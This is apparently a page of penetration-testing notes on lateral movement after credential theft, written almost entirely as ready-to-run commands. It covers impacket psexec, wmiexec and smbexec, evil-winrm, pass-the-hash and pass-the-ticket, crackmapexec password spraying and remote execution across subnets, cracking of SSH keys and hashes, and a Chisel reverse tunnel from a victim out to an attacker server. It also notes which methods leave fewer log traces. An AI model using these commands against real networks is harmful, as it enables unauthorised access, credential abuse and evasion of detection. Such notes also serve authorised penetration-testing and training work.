# Lateral Movement Logic

> Once a credential is in hand, the question becomes: *what does this
> credential let me do, and where?*

## The lateral movement decision tree

```
got cred (cleartext / NTLM / Kerberos ticket / SSH key)
  ↓
where does it work?
  ├─ same host: become other user (runas / su / `psexec64` localhost)
  ├─ other host on this network:
  │    SMB:    impacket-psexec / smbexec / wmiexec
  │    WinRM:  evil-winrm
  │    SSH:    ssh -i / ssh user@
  │    RDP:    xfreerdp / rdesktop (rarely used in chain, often last resort)
  └─ AD-wide:
       Kerberos ticket: pass-the-ticket
       NTLM: pass-the-hash
       password: spray then escalate
```

## Linux → Linux

```bash
# SSH with discovered key
chmod 600 id_rsa; ssh -i id_rsa user@<ip>

# SSH with discovered password
ssh user@<ip>

# Within the box, becoming another user
su - <user>                 # interactive
sudo -u <user> /bin/bash    # if sudo allows
```

When SSH refuses the key (`Permissions are too open`):
```bash
chmod 600 id_rsa
```
When the key is encrypted:
```bash
ssh2john id_rsa > id_rsa.john
john --wordlist=rockyou.txt id_rsa.john
```

## Windows → Windows (with creds)

### evil-winrm (cleanest)
```bash
evil-winrm -i <ip> -u <user> -p '<pass>'
evil-winrm -i <ip> -u <user> -H <NTLM>
```

### impacket-psexec (loud, SYSTEM directly)
```bash
impacket-psexec <domain>/<user>:<pass>@<ip>
impacket-psexec -hashes :<NTLM> <domain>/<user>@<ip>
```
Drops `RemComSvc` / `PSEXESVC` service — visible in event logs.

### impacket-wmiexec (quieter)
```bash
impacket-wmiexec <domain>/<user>:<pass>@<ip>
```
No service, runs over WMI. Slower output (semi-interactive).

### impacket-smbexec
```bash
impacket-smbexec <domain>/<user>:<pass>@<ip>
```
Service-based but uses a different name; alternative if `psexec` is
blocked.

### crackmapexec — the swiss army knife
```bash
# password spray a host range
crackmapexec smb 10.10.10.0/24 -u administrator -p 'Pass1!' --local-auth

# pass-the-hash sweep
crackmapexec smb 10.10.10.0/24 -u administrator -H <NTLM> --local-auth

# enumerate shares / loggedon users / sessions
crackmapexec smb <ip> -u <u> -p <p> --shares
crackmapexec smb <ip> -u <u> -p <p> --loggedon-users
crackmapexec smb <ip> -u <u> -p <p> --sessions

# execute commands
crackmapexec smb <ip> -u <u> -p <p> -x 'whoami'
```

### Local accounts vs. domain accounts
The `--local-auth` flag tells CME / impacket the credentials are local
(not domain). Critical for password reuse sweeps where the local
administrator password is shared across the domain.

## Pass-the-Hash mechanics

NTLM hashes work as authentication directly; you do not need to crack
them.

```bash
# format: ":NTLM" if no LM
impacket-psexec -hashes :aad3b435b51404eeaad3b435b51404ee:<NTLM> Administrator@<ip>
evil-winrm -i <ip> -u Administrator -H <NTLM>
```

This works if:
- The target accepts NTLM auth (most do).
- The hash is for an account that has logon rights to the protocol
  (`SeNetworkLogonRight`).

## Pass-the-Ticket / Overpass-the-Hash

Kerberos environment requires:
- Working DNS to the DC.
- Correct system clock (within 5 min).
- The `KRB5CCNAME` env var pointing at your ccache.

```bash
# get a TGT from a hash (overpass)
impacket-getTGT <domain>/<user> -hashes :<NTLM>
export KRB5CCNAME=<user>.ccache

# get a TGS for the target service
impacket-getST -spn cifs/<host>.<domain> '<domain>/<user>'

# use it
impacket-psexec -k -no-pass <user>@<host>.<domain>
```

`-k -no-pass` tells impacket to authenticate with Kerberos using the
ticket cache.

## Pivoting between subnets

When your foothold sits between you and the rest of the network:

```bash
# Chisel — fast, simple, beats SSH for SOCKS
# attacker
./chisel server -p 8000 --reverse
# victim
./chisel client <attacker>:8000 R:1080:socks

# now use proxychains for any tool
proxychains nmap -sT <internal-ip>
```

Or SSH-based:
```bash
# dynamic SOCKS via SSH
ssh -D 1080 user@<jumpbox>

# specific port forward
ssh -L 8080:<internal>:80 user@<jumpbox>
```

See `tunneling/` for the full toolkit.

## "Found a hash, now what?" decision

```
hash = NTLM (32 hex chars)
  ├─ try pass-the-hash to all known hosts
  └─ try cracking with hashcat -m 1000
hash = $krb5tgs$23$ ...   → mode 13100 (Kerberoast)
hash = $krb5asrep$23$ ... → mode 18200 (AS-REP)
hash = $6$ ...            → mode 1800   (sha512crypt; slow)
hash = $2*$ ...           → mode 3200   (bcrypt; very slow)
hash = $argon2*$ ...      → mode 13000-ish; expect hopeless without weak password
```

Always *try-then-crack*; pass-the-hash is free.

## Spraying across the domain

```bash
# Once you've leaked one cred, see if it works on every host
crackmapexec smb <range> -u <u> -p '<p>'
crackmapexec winrm <range> -u <u> -p '<p>'
```

When a creds combo authenticates on a host but the user is *not* admin
there (`STATUS_LOGON_FAILURE` from `--exec`), the value is still
non-zero: that user has interactive rights, often readable shares, and
is a candidate for becoming-on-target privesc.

## Common lateral movement mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Spraying without `--continue-on-success` | Tool stops at first hit | Add the flag |
| Forgetting `--local-auth` | All sprays "fail" against local admin | Add the flag |
| Wrong domain spec | `STATUS_LOGON_FAILURE` everywhere | `<DOMAIN>/<user>` |
| Clock drift (Kerberos) | `KRB_AP_ERR_SKEW` | `sudo ntpdate <dc>` |
| psexec blocked but evil-winrm not tried | "service can't start" | Try WinRM port 5985 |

## See also

- [07-ad-attack-chains.md](07-ad-attack-chains.md)
- [09-credential-hunting.md](09-credential-hunting.md)
- [../tool-usage/crackmapexec.md](../tool-usage/crackmapexec.md)
- [../tool-usage/impacket.md](../tool-usage/impacket.md)
- [../tunneling/](../tunneling/)
